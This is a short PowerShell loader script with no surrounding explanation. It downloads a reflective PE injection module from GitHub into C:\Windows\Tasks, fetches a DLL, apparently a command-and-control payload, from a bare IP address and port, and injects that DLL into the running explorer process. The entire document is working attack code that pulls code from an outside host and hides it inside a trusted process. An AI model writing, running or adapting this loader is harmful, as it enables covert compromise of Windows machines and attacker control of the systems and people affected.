(New-Object System.Net.WebClient).DownloadFile('https://raw.githubusercontent.com/lyethar/Reflective-PE-Injection/main/Invoke-PEInjection.ps1', 'C:\Windows\Tasks\Invoke-ReflectivePEInjection.ps1')
$bytes = (New-Object System.Net.WebClient).DownloadData('http://20.84.114.52:4322/HTTP_1234_x64.dll')
$procName = "explorer"
$localByName = Get-Process -Name $procName
$procid = $localByName[0].Id
Import-Module 'C:\Windows\Tasks\Invoke-ReflectivePEInjection.ps1'
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
